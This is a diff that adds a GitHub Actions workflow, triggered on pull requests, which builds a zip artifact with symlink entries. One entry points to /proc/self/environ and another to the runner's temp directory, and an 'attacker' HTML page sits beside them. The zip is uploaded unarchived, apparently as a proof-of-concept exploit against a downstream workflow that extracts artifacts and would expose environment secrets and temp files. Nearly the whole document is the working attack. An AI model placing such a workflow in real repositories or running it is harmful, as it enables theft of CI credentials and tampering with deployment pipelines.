@@ -1,0 +1,27 @@
+name: KP6 Preview Trigger
+on:
+  pull_request:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft a zip with symlink entries and upload it unarchived
+        run: |
+          python3 - <<'PY'
+          import zipfile
+          z = zipfile.ZipFile('/tmp/artifacts', 'w')
+          zi = zipfile.ZipInfo('website-metadata.txt'); zi.external_attr = (0o120777) << 16
+          z.writestr(zi, '/proc/self/environ')
+          z.writestr('site/index.html', '<html>attacker</html>\n')
+          zi = zipfile.ZipInfo('site/tempdir'); zi.external_attr = (0o120777) << 16
+          z.writestr(zi, '/home/runner/work/_temp')
+          z.close()
+          print('zip bytes', len(open('/tmp/artifacts','rb').read()))
+      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          path: /tmp/artifacts
+          archive: false
